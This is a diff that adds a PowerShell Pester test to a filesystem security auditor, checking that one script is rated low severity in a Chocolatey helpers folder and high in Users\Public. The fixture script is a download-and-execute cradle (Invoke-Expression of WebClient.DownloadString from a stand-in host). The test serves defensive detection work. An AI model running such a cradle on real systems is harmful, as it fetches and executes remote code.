@@ -279,6 +279,24 @@ Describe 'filesystem module' {
         Get-BoEvidenceText (Get-BoFinding $r 'FS-SCRIPT-001') | Should -Not -Match 'Public'
     }
 
+    It 'download helpers in a package-manager tree are low; the same script in Public stays high' {
+        $fx = Copy-BoTestFixture
+        try {
+            $body = 'Invoke-Expression (New-Object Net.WebClient).DownloadString("http://x.example/a.ps1")'
+            $choco = Join-Path $fx 'fs\ProgramData\chocolatey\helpers'
+            New-Item -ItemType Directory -Path $choco -Force | Out-Null
+            [System.IO.File]::WriteAllText((Join-Path $choco 'runner.ps1'), $body)
+            $r = Invoke-BoAuditJson -Fixture $fx -Modules @('filesystem') -Extra @('-FsPath', 'C:\ProgramData\chocolatey')
+            (Get-BoFinding $r 'FS-SCRIPT-001').severity | Should -Be 'low'
+            $pub = Join-Path $fx 'fs\Users\Public'
+            New-Item -ItemType Directory -Path $pub -Force | Out-Null
+            [System.IO.File]::WriteAllText((Join-Path $pub 'runner.ps1'), $body)
+            $r2 = Invoke-BoAuditJson -Fixture $fx -Modules @('filesystem') -Extra @('-FsPath', 'C:\Users\Public')
+            (Get-BoFinding $r2 'FS-SCRIPT-001').severity | Should -Be 'high'
+        }
+        finally { Remove-BoTestFixture $fx }
+    }
+
     It 'a clean tree yields inventory only' {
         $fx = Copy-BoTestFixture
         try {
